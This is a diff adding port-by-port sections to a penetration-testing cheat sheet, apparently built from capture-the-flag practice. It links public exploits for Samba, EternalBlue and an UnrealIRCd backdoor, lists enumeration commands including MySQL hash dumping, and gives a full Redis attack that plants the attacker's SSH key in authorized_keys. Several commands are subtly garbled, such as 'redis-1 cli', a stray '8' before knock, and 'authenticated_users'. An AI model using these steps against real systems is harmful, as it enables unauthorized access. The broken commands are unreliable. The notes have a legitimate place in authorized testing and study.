@@ -120,3 +120,107 @@ mount -t cifs "//10.1.1.1/share/" /mnt/wins -o vers=1.0,user=root,uid=0
 
 ```
 
+# SMB Exploits :
+
+ Samba "username map script" Command Execution - CVE-2007-2447
+ 
+- Version 3.0.20 through 3.0.25rc3
+- Samba-usermap-exploit.py -
+[https://gist.github.com/joenorton8014/19aaa00e0088738fc429cff2669b9851](https://gist.github.com/joenorton8014/19aaa00e0088738fc429cff2669b9851)
+
+- Eternal Blue - CVE-2017-0144
+- SMB v1 in Windows Vista SP2; Windows Server 2008 SP2 and R2 SP1; Windows 7
+- SP1; Windows 8.1; Windows Server 2012 Gold and R2; Windows RT 8.1; and
+- Windows 10 Gold, 1511, and 1607; and Windows Server 2016
+[https://github.com/adithyan-ak/MS17-010-Manual-Exploit](https://github.com/adithyan-ak/MS17-010-Manual-Exploit)
+- SambaCry - CVE-2017-7494
+  4.5.9 version and before
+[https://github.com/opsxcq/exploit-CVE-2017-7494](https://github.com/opsxcq/exploit-CVE-2017-7494)
+
+
+SNMP (161)
+
+```bash
+
+  snmpwalk -c 1 public -v1 10.0.0.0
+  snmpcheck -t 192.168.1.X -c public
+  onesixtyone -c names -i hosts
+  nmap -sT -p 161 192.168.X.X -oG snmp_results.txt
+  snmpenum -t 192.168.1.X
+```
+
+# IRC (194,6667,6660-7000)
+
+- nmap -sV --script irc-botnet-channels,irc-info,irc-unrealircd-backdoor -p 194,6660-7000
+  irked.htb
+- [https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor](https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor) (exploit code)
+
+# NFS (2049)
+
+
+- showmount -e 10.1.1.27
+- mkdir /mnt/nfs
+- mount -t nfs 192.168.2.4:/nfspath-shown /mnt/nfs
+- Permission Denied ? [https://blog.christophetd.fr/write-up-vulnix](https://blog.christophetd.fr/write-up-vulnix/)
+
+
+
+# MYSQL (3306)
+
+nmap -sV -Pn -vv 10.0.0.1 -p 3306 --script mysql-audit,mysql-databases,mysql-dumphashes,
+mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysqlvariables,
+mysql-vuln-cve2012-2122
+
+
+# Redis (6379)
+
+In the output of config get * you could find the home of the redis user (usually /var/lib/redis
+or /home/redis/.ssh), and knowing this you know where you can write the
+authenticated_users file to access via ssh with the user redis. If you know the home of other
+valid user where you have writable permissions you can also abuse it:
+
+1. Generate a ssh public-private key pair on your pc: ssh-keygen -t rsa
+2. Write the public key to a file :
+(echo -e "\n\n"; cat ./.ssh/id_rsa.pub; echo -e "\n\n") > foo.txt
+3. Import the file into redis : cat foo.txt | redis-cli -h 10.10.10.10 -x set crackit
+4. Save the public key to the authorized_keys file on redis server:
+
+
+```bash
+root@Urahara:~# redis-1 cli -h 10.85.0.52
+10.85.0.52:6379> config set dir /home/test/.ssh/
+OK
+10.85.0.52:6379> config set dbfilename "authorized_keys"
+OK
+10.85.0.52:6379> save
+OK
+```
+
+# Port Knocking :
+
+```bash
+# TCP
+knock -v 192.168.0.116 4 27391 159
+
+# UDP
+knock -v 192.168.0.116 4 27391 159 -u
+
+# TCP & UDP
+8 knock -v 192.168.1.111 159:udp 27391:tcp 4:udp
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
